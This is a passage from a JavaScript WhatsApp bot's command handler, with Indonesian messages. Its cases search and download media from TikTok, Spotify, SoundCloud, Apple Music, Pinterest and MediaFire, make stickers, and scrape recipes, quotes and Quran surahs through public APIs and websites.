  axios.get(`https://vapis.my.id/api/ml-stalk?id=${userId}&zoneid=${zoneId}`)
    .then(response => {
      const result = response.data;
      if (result.status && result.data.status.code === 0) {
        const userData = result.data.data;
        const productData = userData.product;
        const caption = `*✅ ML ACCOUNT FOUND*\n\n` +
          `*🎮 Game*: ${productData.name}\n` +
          `*👤 Username*: ${userData.userNameGame}\n` +
          `*🆔 User ID*: ${userData.gameId}\n` +
          `*🌐 Zone ID*: ${userData.zoneId}\n` +
          `_Mobile Legends: Bang Bang_`;
        m.reply(caption);
      } else {
        const errorMsg = result.data?.status?.message || 'Terjadi kesalahan saat mencari data.';
        m.reply(`❌ Error: ${errorMsg}`);
      }
    })
    .catch(error => {
      console.error(error);
      m.reply('❌ Gagal menghubungi API. Silakan coba lagi nanti.');
    });
} break
//======================================================================================
 
case 'searchtiktok':
case 'stt':
case 'searchtt': {
if (!text) return m.reply(`${prefix + command} jj epep`)
m.reply('Proses ')
await fetch(`https://api.diioffc.web.id/api/search/tiktok?query=${text}`).then(async (res) => {
let response = await res.json()
let result = response.result[Math.floor(Math.random() * response.result.length)]
Sky.sendMessage(m.chat, { video: { url: result.media.no_watermark }, mimetype: 'video/mp4', caption: result.title }, { quoted : m })
setTimeout(() => {
Sky.sendMessage(m.chat, { audio: { url: result.media.audio }, mimetype: "audio/mpeg", contextInfo: { externalAdReply: { thumbnailUrl: result.thumbnail, title: result.music.title, body: result.music.author, sourceUrl: null, renderLargerThumbnail: true, mediaType: 1}}}, { quoted: m })
}, 3000)
}).catch(err => m.reply('Error'))
}
break
    
//===================================================================================
  
case "setppbotpanjang": case "setpppanjang": {

if (!isOwner) return m.reply(mess.owner)

if (/image/g.test(mime)) {

var medis = await Sky.downloadAndSaveMediaMessage(qmsg, 'ppbot.jpeg', false)

var { img } = await generateProfilePicture(medis)

await Sky.query({

tag: 'iq',

attrs: {

to: botNumber,

type:'set',

xmlns: 'w:profile:picture'

},

content: [

{

tag: 'picture',

attrs: { type: 'image' },

content: img

}

]

})

await fs.unlinkSync(medis)

m.reply("Berhasil Mengganti Foto Profil Bot ✅")

} else return m.reply(example('dengan mengirim foto'))

}

break
    
//==================================================================================
    
case "searchspotify": case "spotify": case "sspotify": case "ssp": {
  if (!text) return m.reply(`Example: ${prefix + command} judul lagu`);
 
  try {
    let api = await fetch(`https://api-ghostx.biz.id/api/search/spotifysearch?q=${text}`);
    let data = await api.json();
 
    if (!data.status) return m.reply('Search failed! Try again later.');
 
    let hasil = `乂 *HASIL PENCARIAN SPOTIFY* ◦\n\n`;
    for (let i = 0; i < Math.min(10, data.result.length); i++) {
      let lagu = data.result[i];
      hasil += `乂 *${i + 1}.* ${lagu.trackName}\n`;
      hasil += `乂 *Artis* : ${lagu.artistName}\n`;
      hasil += `乂 *URL* : ${lagu.externalUrl}\n\n`;
    }
    hasil += `Ketik ${prefix}spdown <url> untuk download music Spotify!`;
 
    await Sky.sendMessage(m.chat, { text: hasil });
  } catch (e) {
    console.log(e);
    m.reply('Error occurred while searching!');
  }
}
break
 
case "sdown": case "spdown":
case "spotifydown": 
case "downspotify": {
  if (!text) return m.reply(`Example: ${prefix + command} url spotify`);
 
  m.reply('⏳ Tunggu');
 
  try {
    console.log(`🔍 Fetching data from: ${text}`);
const axios = require('axios');
    const response = await axios.post('https://spotymate.com/api/download-track',
      { url: text },
      {
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36',
          'Referer': 'https://spotymate.com/'
        }
      }
    );
 
    if (response.data && response.data.file_url) {
      let caption = `乂 *SPOTIFY DOWNLOADER* ◦\n\n`;
      caption += `乂 *Status* : Berhasil ✅\n`;
      caption += `乂 *URL* : ${text}\n`;
 
      await Sky.sendMessage(m.chat, { text: caption });
      await Sky.sendMessage(m.chat, { 
        audio: { url: response.data.file_url }, 
        mimetype: 'audio/mpeg',
        fileName: 'spotify_download.mp3'
      });
    } else {
      m.reply('❌ Tidak dapat menemukan link unduhan!');
    }
  } catch (error) {
    console.log(error);
    m.reply(`❌ Error: ${error.message}`);
  }
}
break
 
//Soundcloud
case "ssong": case "searchsoundcloud": case "searchsong": {
    if (!text) return m.reply("Example: .ssong Lathi");
    m.reply("Searching for songs on SoundCloud...");
 
    try {
        const query = encodeURIComponent(text);
        const response = await fetch(`https://archive-ui.tanakadomp.biz.id/search/soundcloud?q=${query}`);
        const data = await response.json();
 
        if (!data.status || !data.result || data.result.length === 0) {
            return m.reply("No songs found. Try a different search term.");
        }
 
        let teks = `🎵 *SOUNDCLOUD SEARCH RESULTS*\n\n`;
 
        const songs = data.result.slice(0, 15);
 
        songs.forEach((song, i) => {
            teks += `*${i+1}.* ${song.title || "Unknown Title"}\n`;
            teks += `👤 *Artist:* ${song.artist || "Unknown Artist"}\n`;
            teks += `⏱️ *Duration:* ${song.duration || "Unknown"}\n`;
            teks += `📊 *Plays:* ${song.plays || "Unknown"}\n`;
            teks += `🔗 *URL:* ${song.url || "No URL available"}\n\n`;
        });
 
        teks += `To download a song, use: ${prefix}scdl [URL]`;
        Sky.sendMessage(m.chat, { text: teks }, { quoted: m });
 
    } catch (error) {
        console.log(error);
 
        try {
            m.reply("Primary search failed. Trying backup method...");
 
            const fetchResponse = await fetch(`https://m.soundcloud.com/search?q=${encodeURIComponent(text)}`);
            const html = await fetchResponse.text();
 
            const urlRegex = /https:\/\/soundcloud\.com\/([^"]+)/g;
            const titleRegex = /<h2[^>]*>(.*?)<\/h2>/g;
 
            const urls = [...html.matchAll(urlRegex)].map(match => match[0]).filter(url => 
                !url.includes('/tags/') && !url.includes('/discover') && 
                !url.includes('/stream') && !url.includes('/upload')
            );
 
            const titles = [...html.matchAll(titleRegex)].map(match => match[1]);
 
            if (urls.length === 0) {
                return m.reply("No songs found with backup method. Try a different search term.");
            }
 
            let teks = `🎵 *SOUNDCLOUD SEARCH RESULTS (BASIC)*\n\n`;
 
            const limit = Math.min(10, urls.length);
 
            for (let i = 0; i < limit; i++) {
                teks += `*${i+1}.* ${titles[i] || `Track ${i+1}`}\n`;
                teks += `🔗 *URL:* ${urls[i]}\n\n`;
            }
 
            teks += `To download a song, use: ${prefix}scdl [URL]`;
            Sky.sendMessage(m.chat, { text: teks }, { quoted: m });
 
        } catch (fallbackError) {
            console.log(fallbackError);
            m.reply("Error searching for songs. Please try again later or check if SoundCloud is accessible.");
        }
    }
}
break
 
case "scdl": case "songdown":
case "downsong": {
 if (!text) return m.reply(`Example: ${prefix + command} url`);
 
 m.reply('Tunggu');
 
 try {
 let api = await fetch(`https://rest.cloudkuimages.xyz/api/download/soundcloud?url=${text}`);
 let data = await api.json();
 
 if (!data.status) return m.reply('Download failed! Try again later.');
 
 let caption = `乂 *SOUNDCLOUD DOWNLOADER* ◦\n\n`;
 caption += `乂 *Status* : ${data.status}\n`;
 caption += `乂 *Creator* : ${data.creator}\n`;
 caption += `乂 *Title* : ${data.result.title}\n`;
 caption += `乂 *Thumbnail* : ${data.result.image}\n`;
 caption += `乂 *Download* : ${data.result.download}\n`;
 
 await Sky.sendMessage(m.chat, { image: { url: data.result.image }, caption: caption });
 await Sky.sendMessage(m.chat, { audio: { url: data.result.download }, mimetype: "audio/mpeg" });
 } catch (e) {
 console.log(e);
 m.reply('Error occurred while downloading!');
 }
}
break

 
//=================================================================================
    

case "bratvid":
case "bratvideo": {
  if (!text) return m.reply(example('teksnya'));
  try {
    await Sky.sendMessage(m.chat, { react: { text: '🕖', key: m.key } });

    const axios = require('axios');
    const fs = require('fs');
    const ffmpeg = require('fluent-ffmpeg');
    const ffmpegPath = require('ffmpeg-static');
    ffmpeg.setFfmpegPath(ffmpegPath);

    // Ambil file dari API brat
    const brat = `https://brat.siputzx.my.id/gif?text=${encodeURIComponent(text)}`;
    const response = await axios.get(brat, { responseType: 'arraybuffer', validateStatus: () => true });

    // Cek response valid
    if (response.status !== 200 || !response.data || response.data.length < 5000) {
      return m.reply("⚠️ API Brat error atau tidak mengirim file yang valid.");
    }

    console.log("Content-Type:", response.headers["content-type"]);
    console.log("Data Size:", response.data.length);

    // Simpan buffer ke file sementara
    const tmpInput = "./brat.gif";
    const tmpOutput = "./brat.webp";
    fs.writeFileSync(tmpInput, response.data);

    // Konversi GIF ke WebP dengan ffmpeg
    await new Promise((resolve, reject) => {
      ffmpeg(tmpInput)
        .outputOptions([
          "-vcodec", "libwebp",
          "-vf", "fps=15,scale=512:-1:flags=lanczos",
          "-lossless", "1",
          "-preset", "default",
          "-loop", "0",
          "-an",
          "-vsync", "0"
        ])
        .save(tmpOutput)
        .on("end", resolve)
        .on("error", reject);
    });

    // Kirim stiker ke chat
    const stickerBuffer = fs.readFileSync(tmpOutput);
    await Sky.sendMessage(m.chat, { sticker: stickerBuffer }, { quoted: m });
    await Sky.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    // Bersihkan file sementara
    fs.unlinkSync(tmpInput);
    fs.unlinkSync(tmpOutput);

  } catch (err) {
    console.error("Error:", err);
    m.reply("❌ Gagal membuat stiker Brat. Coba lagi nanti.");
  }
}
break;

    
//===================================================================================
    

/*
Jangan Hapus Wm Bang 

*Cookpad  Plugins Esm*

Ya Intinya Cari Resep 

*[Sumber]*
https://whatsapp.com/channel/0029Vb3u2awADTOCXVsvia28

*[Sumber Scrape]*

https://whatsapp.com/channel/0029Vb3ejRu2v1IvxWSPml0q/160
*/

case 'cookpad' : {
class CookpadScraper {
  constructor(searchTerm) {
    this.searchTerm = searchTerm;
    this.baseUrl = 'https://cookpad.com/id/cari/';
  }

  async fetchSearchResults(page = 1) {
    const url = `${this.baseUrl}${this.searchTerm}?page=${page}`;
    const response = await axios.get(url);
    return cheerio.load(response.data);
  }

  async extractRecipeLinks($) {
    const links = [];
    $('a.block-link__main').each((i, el) => {
      const href = $(el).attr('href');
      if (href) {
        links.push(`https://cookpad.com${href}`);
      }
    });
    if (links.length === 0 && $('.text-cookpad-14.xs\\:text-cookpad-20.font-semibold').text().includes('Tidak dapat menemukan resep?')) {
      throw new Error('Tidak ditemukan resep untuk pencarian ini.');
    }
    return links;
  }

  async fetchRecipePage(url) {
    const response = await axios.get(url);
    return cheerio.load(response.data);
  }

  async extractRecipeDetails($) {
    const title = $('h1').text().trim();
    const mainImage = $('img[alt^="Foto resep"]').attr('src');
    const cookingTime = $('.flex.flex-wrap .mise-icon-text').first().text().trim();
    const serving = $('.flex.flex-wrap .mise-icon-text').last().text().trim();

    const ingredients = [];
    $('#ingredients .ingredient-list ol li').each((i, el) => {
      if ($(el).hasClass('font-semibold')) {
        const subheading = $(el).find('span').text().trim();
        ingredients.push(`*${subheading}*`);
      } else {
        const quantity = $(el).find('bdi').text().trim();
        const ingredient = $(el).find('span').text().trim();
        ingredients.push(`- ${quantity} ${ingredient}`);
      }
    });

    const steps = [];
    $('ol.list-none li.step').each((i, el) => {
      const stepNumber = $(el).find('.flex-shrink-0 .text-cookpad-14').text().trim();
      const description = $(el).find('div[dir="auto"] p').text().trim();
      steps.push(`${stepNumber}. ${description}`);
    });

    return {
      title,
      mainImage,
      cookingTime,
      serving,
      ingredients: ingredients.join('\n'),
      steps: steps.join('\n')
    };
  }

  async scrapeRecipes() {
    try {
      const $ = await this.fetchSearchResults();
      const links = await this.extractRecipeLinks($);

      if (links.length === 0) {
        throw new Error('Tidak ditemukan resep untuk pencarian ini.');
      }

      const recipePage = await this.fetchRecipePage(links[0]);
      return await this.extractRecipeDetails(recipePage);
    } catch (error) {
      return { error: error.message };
    }
  }
}


  if (!text) return m.reply('Masukkan nama resep yang ingin dicari.\nContoh: .resep ayam goreng');

  let scraper = new CookpadScraper(text);
  let recipe = await scraper.scrapeRecipes();

  if (recipe.error) return m.reply(recipe.error);

  let caption = `*${recipe.title}*\n\n` +
                `*Waktu Masak :* ${recipe.cookingTime}\n` +
                `*Porsi :* ${recipe.serving}\n\n` +
                `*Bahan-Bahan :*\n${recipe.ingredients}\n\n` +
                `*Langkah-Langkah :*\n${recipe.steps}`;

  if (recipe.mainImage) {
    Sky.sendMessage(m.chat, { image: { url: recipe.mainImage }, caption }, { quoted: m });
  } else {
    m.reply(caption);
  }
};

break
 
//==================
class AppleMusic {
    async search(q) {
        try {
            let { data } = await axios.get(`https://music.apple.com/id/search?term=${encodeURIComponent(q)}`);
            let $ = cheerio.load(data);
            let result = [];

            $(".shelf-grid__body ul li .track-lockup").each((_, el) => {
                let title = $(el).find(".track-lockup__content li").eq(0).find("a").text().trim();
                let album = $(el).find(".track-lockup__content li").eq(0).find("a").attr("href");
                let crop = album.split("/").pop();
                let song = album.replace(crop, "").replace("/album/", "/song/") + album.split("i=")[1];
                let image = $(el).find(".svelte-3e3mdo source").eq(1).attr("srcset").split(",")[1].split(" ")[0].trim();
                let artist = {
                    name: $(el).find(".track-lockup__content li").eq(1).find("a").text().trim(),
                    url: $(el).find(".track-lockup__content li").eq(1).find("a").attr("href"),
                };
                result.push({ title, image, song, artist });
            });

            return result;
        } catch (error) {
            throw new Error("Gagal mengambil data dari Apple Music.");
        }
    }

    async download(url) {
        try {
            let { data } = await axios.get(url);
            let $ = cheerio.load(data);
            let json = JSON.parse($("script").eq(0).text());
            delete json.audio["@type"];
            delete json.audio.audio;
            delete json.audio.inAlbum["@type"];
            delete json.audio.inAlbum.byArtist;
            json.audio.artist = json.audio.byArtist[0];
            delete json.audio.artist["@type"];
            delete json.audio.byArtist;

            let { data: searchData } = await axios.get("https://aaplmusicdownloader.com/api/composer/ytsearch/mytsearch.php", {
                params: {
                    name: json.audio.name,
                    artist: json.audio.artist.name,
                    album: json.audio.inAlbum.name,
                    link: json.audio.url,
                },
            });

            if (!searchData.videoid) throw new Error("Gagal mendapatkan video ID.");
            let { data: downloadData } = await axios.get("https://aaplmusicdownloader.com/api/ytdl.php?q=" + searchData.videoid);
            
            return { metadata: json.audio, download: downloadData.dlink };
        } catch (error) {
            throw new Error("Gagal mengunduh musik.");
        }
    }
}

const appleMusic = new AppleMusic();

case "applemusic" : {
    if (!args.length) return m.reply("Mau cari lagu apa?");

    let query = args.join(" ");
    let results = await appleMusic.search(query);

    if (!results.length) return m.reply("Ga nemu lagu yang cocok.");

    let { title, image, song, artist } = results[0];
    
    let caption = `🎵 *Judul:* ${title}\n🎤 *Artis:* ${artist.name}\n🔗 *Link:* ${song}`;

    await Sky.sendMessage(m.chat, { image: { url: image }, caption }, { quoted: m });

    try {
        let downloadData = await appleMusic.download(song);
        if (!downloadData.download) return m.reply("Gagal mengunduh lagu.");

        await Sky.sendMessage(m.chat, { 
            audio: { url: downloadData.download }, 
            mimetype: 'audio/mp4' 
        }, { quoted: m });
    } catch (error) {
        m.reply("Maaf, gagal mengunduh lagu.");
    }
};
break
//==================
    
case 'pin2' :
case 'pinterest2': {

const agent = new https.Agent({
    rejectUnauthorized: true,
    maxVersion: 'TLSv1.3',
    minVersion: 'TLSv1.2'
});

async function getCookies() {
    try {
        const response = await axios.get('https://www.pinterest.com/csrf_error/', { httpsAgent: agent });
        const setCookieHeaders = response.headers['set-cookie'];
        if (setCookieHeaders) {
            const cookies = setCookieHeaders.map(cookieString => {
                const cookieParts = cookieString.split(';');
                return cookieParts[0].trim();
            });
            return cookies.join('; ');
        }
        return null;
    } catch {
        return null;
    }
}

async function pinterest(query) {
    try {
        const cookies = await getCookies();
        if (!cookies) return [];

        const url = 'https://www.pinterest.com/resource/BaseSearchResource/get/';
        const params = {
            source_url: `/search/pins/?q=${query}`,
            data: JSON.stringify({
                options: {
                    isPrefetch: false,
                    query: query,
                    scope: "pins",
                    no_fetch_context_on_resource: false
                },
                context: {}
            }),
            _: Date.now()
        };

        const headers = {
            'accept': 'application/json, text/javascript, */*, q=0.01',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-US,en;q=0.9',
            'cookie': cookies,
            'dnt': '1',
            'referer': 'https://www.pinterest.com/',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
            'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="133.0.3065.92", "Chromium";v="133.0.6943.142"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
            'x-app-version': 'c056fb7',
            'x-pinterest-appstate': 'active',
            'x-pinterest-pws-handler': 'www/[username]/[slug].js',
            'x-pinterest-source-url': '/hargr003/cat-pictures/',
            'x-requested-with': 'XMLHttpRequest'
        };

        const { data } = await axios.get(url, { httpsAgent: agent, headers, params });
        return data.resource_response.data.results
            .filter(v => v.images?.orig)
            .map(result => ({
                upload_by: result.pinner.username,
                fullname: result.pinner.full_name,
                followers: result.pinner.follower_count,
                caption: result.grid_title,
                image: result.images.orig.url,
                source: "https://id.pinterest.com/pin/" + result.id,
            }));
    } catch {
        return [];
    }
}

    if (!text) return Reply(`*Penggunaan:* ${prefix + command} <query> <jumlah>\n\n*Contoh:* ${prefix + command} anime 3`);
    
    let [query, count] = text.split(' ');
    let imgCount = 5;

    if (text.indexOf(' ') !== -1) {
        const lastWord = text.split(' ').pop();
        if (!isNaN(lastWord) && lastWord.trim() !== '') {
            imgCount = parseInt(lastWord);
            query = text.substring(0, text.lastIndexOf(' '));
        } else {
            query = text;
        }
    } else {
        query = text;
    }
    
   m.reply('Searching Pinterest images...');
    
    try {
        const results = await pinterest(query);
        if (results.length === 0) return Reply(`No results found for "${query}". Try another search term.`);
        
        const imagesToSend = Math.min(results.length, imgCount);
        Reply(`Sending ${imagesToSend} Pinterest images for "${query}"...`);
        
        for (let i = 0; i < imagesToSend; i++) {
            await belz.sendMessage(m.chat, { image: { url: results[i].image } });
        }
    } catch {
        m.reply('Error occurred while fetching Pinterest images. Please try again later.');
    }
}
break
    


//==================
    
// *(Fitur Quotes(Case))*

// [ Sumber ] https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v


case 'quotes': case 'kata²': case 'kata-kata': case 'kata"': {
if (!args[0]) return m.reply(example("kata kata hari ini"));


  async function squotes(input) {
    return new Promise((resolve, reject) => {
      fetch('https://jagokata.com/kata-bijak/kata-' + input.replace(/\s/g, '_') + '.html?page=1')
        .then(res => res.text())
        .then(res => {
          const $ = cheerio.load(res)
          let data = []
          $('div[id="main"]').find('ul[id="citatenrijen"] > li').each(function (index, element) {
            let x = $(this).find('div[class="citatenlijst-auteur"] > a').text().trim()
            let y = $(this).find('span[class="auteur-beschrijving"]').text().trim()
            let z = $(element).find('q[class="fbquote"]').text().trim()
            data.push({ author: x, bio: y, quote: z })
          })
          data.splice(2, 1)
          if (data.length == 0) return resolve({ creator: "Wudysoft", status: false })
          resolve({ creator: "Fruatre", status: true, data })
        }).catch(reject)
    })
  }

  squotes(args[0]).then(res => {
    if (res.status) {
      let teks = ''
      res.data.forEach(function (item, index) {
        teks += `*${item.quote}*\n- ${item.author}, ${item.bio}\n\n`
      })
      m.reply(teks)
    } else {
      m.reply('Tidak ada kutipan yang ditemukan.')
    }
  })
}
break
    
//=========================================
    
 /*  

  Base : MediaFire Downloader
  Telegram : t.me/kayzuMD
  Type : Plug-in CJS
  recode by rafz
  Share Code : MediaFire
  Link CH : https://whatsapp.com/channel/0029Vb2OwWCElagtreIoke17

*/



case 'mediafire' : {
const axios = require("axios");
const fs = require("fs");
const path = require("path");
    
  if (!args[0]) return m.reply(example("linknya"));

  let mediafireURL = args[0];

  try {
    // Kirim reaksi proses
    await Sky.sendMessage(m.chat, {
      react: { text: "🕒", key: m.key }
    });

    let apiUrl = `https://fastrestapis.fasturl.cloud/downup/mediafiredown?url=${encodeURIComponent(mediafireURL)}`;
    let { data } = await axios.get(apiUrl);

    if (data.status !== 200 || !data.result) {
      return m.reply("❌ Gagal mengambil informasi file. Pastikan link valid.");
    }

    let fileInfo = data.result;
    let fileName = fileInfo.filename || "Tidak diketahui";
    let fileSize = fileInfo.size || "Tidak diketahui";
    let fileType = fileInfo.filetype || "Tidak diketahui";
    let fileOwner = fileInfo.owner || "Tidak diketahui";
    let filePrivacy = fileInfo.privacy === "public" ? "Publik" : "Pribadi";
    let fileCreated = fileInfo.created || "Tidak diketahui";
    let fileRevision = fileInfo.revision || "Tidak ada";
    let filePassword = fileInfo.password === "no" ? "Tidak ada" : "Ya";

    let infoMsg = `📂 *Informasi File MediaFire* 📂\n\n` +
                  `📌 *Nama File:* ${fileName}\n` +
                  `📦 *Ukuran:* ${fileSize}\n` +
                  `📂 *Tipe:* ${fileType}\n` +
                  `👤 *Pemilik:* ${fileOwner}\n` +
                  `🔑 *Password:* ${filePassword}\n` +
                  `🛡️ *Privasi:* ${filePrivacy}\n` +
                  `📅 *Dibuat:* ${fileCreated}\n` +
                  `🔄 *Revisi:* ${fileRevision}\n\n` +
                  `⏱️ Sedang mengunduh file...`;

    m.reply(infoMsg);

    // Cek ukuran file (max 100MB)
    let maxSize = 100 * 1024 * 1024; // 100MB dalam byte
    if (fileSize.includes("GB") || (parseFloat(fileSize) * 1024 * 1024) > maxSize) {
      return m.reply("❌ File terlalu besar! WhatsApp hanya mendukung pengiriman file hingga 100MB.");
    }

    // Proses download file
    let filePath = path.join(__dirname, "./library/database/sampah/", fileName);
    let writer = fs.createWriteStream(filePath);
    let response = await axios({
      url: fileInfo.download,
      method: "GET",
      responseType: "stream",
    });

    response.data.pipe(writer);

    writer.on("finish", async () => {
      await Sky.sendMessage(m.chat, {
        document: fs.readFileSync(filePath),
        mimetype: "application/octet-stream",
        fileName
       }, { quoted: m });

      fs.unlinkSync(filePath);

      // Kirim reaksi selesai
      await Sky.sendMessage(m.chat, {
        react: { text: "✅", key: m.key }
      });
    });

    writer.on("error", () => {
      m.reply("❌ Gagal mengunduh file.");
    });

  } catch (error) {
    console.error(error);
    m.reply("❌ Terjadi kesalahan saat mengambil data.");
  }
}
break

//===========================================
/*(Fitur SearchSurah + Terjemahan)*

[ Sumber ] https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v

*/
case 'selectsurah': case "carisurah": case "searchsurah": {
    if (!args[0]) return m.reply(`🚫 Masukkan nomor surah yang valid (1-114)\n\n*List Surah :*
1 : Al-Fatihah
2 : Al-Baqarah
3 : Ali 'Imran
4 : An-Nisa'
5 : Al-Ma'idah
6 : Al-An'am
7 : Al-A’raf
8 : Al-Anfal
9 : At-Taubah
10 : Yunus
11 : Hud
12 : Yusuf
13 : Ar-Ra’d
14 : Ibrahim
15 : Al-Hijr
16 : An-Nahl
17 : Al-Isra'
18 : Al-Kahf
19 : Maryam
20 : Ta Ha
21 : Al-Anbiya
22 : Al-Hajj
23 : Al-Mu’minun
24 : An-Nur
25 : Al-Furqan
26 : Asy-Syu'ara'
27 : An-Naml
28 : Al-Qasas
29 : Al-'Ankabut
30 : Ar-Rum
31 : Luqman
32 : As-Sajdah
33 : Al-Ahzab
34 : Saba’
35 : Fatir
36 : Ya Sin
37 : As-Saffat
38 : Sad
39 : Az-Zumar
40 : Ghafir
41 : Fussilat
42 : Asy-Syura
43 : Az-Zukhruf
44 : Ad-Dukhan
45 : Al-Jasiyah
46 : Al-Ahqaf
47 : Muhammad
48 : Al-Fath
49 : Al-Hujurat
50 : Qaf
51 : Az-Zariyat
52 : At-Tur
53 : An-Najm
54 : Al-Qamar
55 : Ar-Rahman
56 : Al-Waqi’ah
57 : Al-Hadid
58 : Al-Mujadilah
59 : Al-Hasyr
60 : Al-Mumtahanah
61 : As-Saff
62 : Al-Jumu’ah
63 : Al-Munafiqun
64 : At-Tagabun
65 : At-Talaq
66 : At-Tahrim
67 : Al-Mulk
68 : Al-Qalam
69 : Al-Haqqah
70 : Al-Ma’arij
71 : Nuh
72 : Al-Jinn
73 : Al-Muzzammil
74 : Al-Muddassir
75 : Al-Qiyamah
76 : Al-Insan
77 : Al-Mursalat
78 : An-Naba’
79 : An-Nazi’at
80 : 'Abasa
81 : At-Takwir
82 : Al-Infitar
83 : Al-Tatfif
84 : Al-Insyiqaq
85 : Al-Buruj
86 : At-Tariq
87 : Al-A’la
88 : Al-Gasyiyah
89 : Al-Fajr
90 : Al-Balad
91 : Asy-Syams
92 : Al-Lail
93 : Ad-Duha
94 : Al-Insyirah
95 : At-Tin
96 : Al-'Alaq
97 : Al-Qadr
98 : Al-Bayyinah
99 : Az-Zalzalah
100 : Al-'Adiyat
101 : Al-Qari'ah
102 : At-Takasur
103 : Al-'Asr
104 : Al-Humazah
105 : Al-Fil
106 : Quraisy
107 : Al-Ma’un
108 : Al-Kausar
109 : Al-Kafirun
110 : An-Nasr
111 : Al-Lahab
112 : Al-Ikhlas
113 : Al-Falaq
114 : An-Nas`);
    
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
    const cache = new Map();
    const CACHE_DURATION = 3600000; 

    async function selectSurah(link) {
        try {
        
            const { data } = await axios.get(link, {
                timeout: 10000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            });
            
            const $ = cheerio.load(data);
            const Result = [];
            const Isi = [];
            const surah = $('body > main > article > h1').text().trim() || 'Surah tidak ditemukan';
            const bismillah = $('body > main > article > p').text().trim() || '';
            
            $('body > main > article > ol > li').each((i, e) => {
                const arabic = $(e).find('p.arabic').text().trim() || '';
                const baca = $(e).find('p.translate').text().trim() || '';
                const arti = $(e).find('p.meaning').text().trim() || '';
                
                if (arabic || baca || arti) {
                    Isi.push({ arabic, baca, arti });
                }
            });
            
            if (Isi.length === 0) {
                throw new Error('Tidak dapat menemukan ayat-ayat surah');
            }
            
            Result.push({ surah, bismillah }, Isi);
            return Result;
        } catch (error) {
            throw new Error(`Error mengambil surah: ${error.message}`);
        }
    }

    async function listsurah() {
        try {
        
            const { data } = await axios.get('https://litequran.net/', {
                timeout: 10000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            });
            
            const $ = cheerio.load(data);
            const Result = [];
            
            $('body > main > ol > li').each((i, e) => {
                const element = $(e).find('a');
                if (element.length) {
                    const name_surah = element.text().trim();
                    const href = element.attr('href');
                    if (name_surah && href) {
                        Result.push({
                            link: 'https://litequran.net/' + href,
                            name_surah
                        });
                    }
                }
            });
            
            if (Result.length === 0) {
                throw new Error('Tidak dapat menemukan daftar surah');
            }
            
            return Result;
        } catch (error) {
            throw new Error(`Error mengambil daftar surah: ${error.message}`);
        }
    }

    async function getSurah(surahIndex) {
        try {
            
            const cacheKey = `surah_${surahIndex}`;
            const cachedData = cache.get(cacheKey);
            if (cachedData && (Date.now() - cachedData.timestamp) < CACHE_DURATION) {
                return cachedData.data;
            }

            const surahList = await listsurah();
            
            if (surahIndex < 1 || surahIndex > 114) {
                return "🚫 *Nomor surah tidak valid.* Silakan masukkan nomor 1-114.";
            }

            if (surahIndex > surahList.length) {
                return "🚫 *Surah tidak ditemukan.* Coba periksa kembali nomor surah.";
            }

            await delay(500);

            const selectedSurah = surahList[surahIndex - 1];
            const surahContent = await selectSurah(selectedSurah.link);

            let response = `🕌 *${surahContent[0].surah}*\n\n`;
            if (surahContent[0].bismillah) {
                response += `${surahContent[0].bismillah}\n\n`;
            }
            response += `📜 *Ayat-ayat suci Al-Quran:*\n\n`;

            surahContent[1].forEach((ayah, index) => {
                response += `*𖦹 Ayat ${index + 1}:*\n`;
                if (ayah.arabic) response += `🕋 ${ayah.arabic}\n`;
                if (ayah.baca) response += `📖 ${ayah.baca}\n`;
                if (ayah.arti) response += `📚 ${ayah.arti}\n\n`;
            });

            response += `\n🤲 *Semoga Allah memberikan pemahaman dari ayat-ayat ini.*`;

            
            cache.set(cacheKey, {
                data: response,
                timestamp: Date.now()
            });

            return response;
        } catch (error) {
            return `🚫 *Error:* ${error.message}`;
        }
    }

    try {
        const surahIndex = parseInt(args[0]);
        if (isNaN(surahIndex)) {
            return m.reply("🚫 *Masukkan nomor surah yang valid (1-114).*");
        }
        
        m.reply("⏳ *Sedang mengambil surah...*");
        const response = await getSurah(surahIndex);
        m.reply(response);
    } catch (error) {
        m.reply(`🚫 *Terjadi kesalahan:* ${error.message}`);
    }
    }
    break
    
 
 //====================================

case "bratt": {

 if (!text) return m.reply(`Contoh : ${prefix + command} Hai kak`);

 const safeText = typeof text === 'string' ? text : String(text || '');

 if (safeText.length > 100) return m.reply(`Karakter terbatas, max 100!`);

 try {

 const messageText = `Yuk pilih tipe *brat* yang Kamu suka, ada beberapa tipe nih! Klik *tombol* di bawah ini ya, kak! 😋👇`;
     
await Sky.sendMessage(

    {
        text: "Description Of Messages", //Additional information
        title: "Title Of Messages",
        subtitle: "Subtitle Message",
        footer: "Footer Messages",
        interactiveButtons: [
             {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                     display_text: "Display Button",
                     id: "ID"
                })
             },
             {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                     display_text: "Display Button",
                     url: "https://www.example.com"
                })
             }
        ]
    },
  {
    quoted : m
  })
    
 } catch (error) {

 console.error('Error in bratt command:', error);

 m.reply('Terjadi kesalahan saat memproses perintah. Silakan coba lagi.');

 }

} 

break
    
 //====================================

case 'removebg' : case 'rbg' : {
     
async function removebg(buffer) {
    try {
